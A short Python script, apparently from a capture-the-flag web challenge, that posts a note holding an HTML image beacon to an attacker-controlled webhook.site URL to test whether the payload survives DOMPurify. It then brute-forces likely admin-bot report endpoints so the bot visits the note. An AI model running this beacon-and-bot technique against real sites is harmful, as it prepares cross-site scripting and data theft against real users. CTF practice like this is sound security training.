import requests, re

BASE = 'https://outfjord-your-notes-1860d6ea0037.chall.nnsc.tf'
WH = 'https://webhook.site/1483cf81-5ee2-4ccb-974d-f3f8ff59ec00'
s = requests.Session()
s.headers.update({'User-Agent':'Mozilla/5.0'})

# Create a note with a plain img beacon (survives DOMPurify) to confirm bot loads it
body = f'<h1>hello</h1><img src="{WH}/beacon-loaded">'
r = s.post(BASE + '/api/note', json={'title':'beacon','body':body}, timeout=15)
print('create:', r.status_code, r.text)
nid = r.json()['id']
url = f'{BASE}/?note={nid}&theme=aurora'
print('note url:', url)

# Find the admin bot submit endpoint. The UI had an "Admin bot" with a url field + Submit.
# Try common endpoints
for ep in ['/api/report', '/report', '/api/visit', '/visit', '/api/admin', '/admin/visit', '/bot', '/api/bot']:
    rr = s.post(BASE+ep, json={'url':url}, timeout=15)
    print(f'{ep}: [{rr.status_code}] {rr.text[:120]}')
